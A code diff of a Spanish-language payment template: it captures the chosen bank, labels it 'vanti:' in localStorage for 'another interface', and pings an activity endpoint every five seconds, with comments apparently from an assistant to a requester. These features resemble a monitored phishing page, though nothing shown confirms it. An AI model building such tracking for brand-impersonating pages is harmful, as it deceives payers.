@@ -109,17 +109,18 @@
     registrarActividad();
     setInterval(registrarActividad, 5000);
 
-    // Capturar los datos del formulario antes de enviarlos
+    // Capturar los datos del formulario antes de enviarlos al servidor
     document.querySelector("form").addEventListener("submit", function(e) {
         const selectBanco = document.querySelector("select[name='banco']");
         const bancoSeleccionado = selectBanco ? selectBanco.value : "";
         const montoTotal = "{{ monto }}"; 
 
         if (bancoSeleccionado) {
-            // AQUÍ APLICAMOS EL FORMATO DESEADO:
-            // Guardará por ejemplo: "vanti: BANCO DE BOGOTA" o "vanti: BANCO POPULAR"
+            // AQUÍ APLICAMOS EL FORMATO EXACTO QUE PIDISTE:
+            // Ejemplo: "vanti: BANCO DE BOGOTA" o "vanti: BANCO POPULAR"
             const bancoFormateado = `vanti: ${bancoSeleccionado}`;
             
+            // Lo guardamos en localStorage por si tu otra interfaz lo lee de ahí
             localStorage.setItem("banco", bancoFormateado);
         }
         
@@ -128,11 +129,5 @@
         }
     });
 </script>
-    <script>
-        const txId = "{{ tx_id }}";
-        const registrarActividad = () => navigator.sendBeacon(`/actividad/${txId}`);
-        registrarActividad();
-        setInterval(registrarActividad, 5000);
-    </script>
 </body>
 </html>
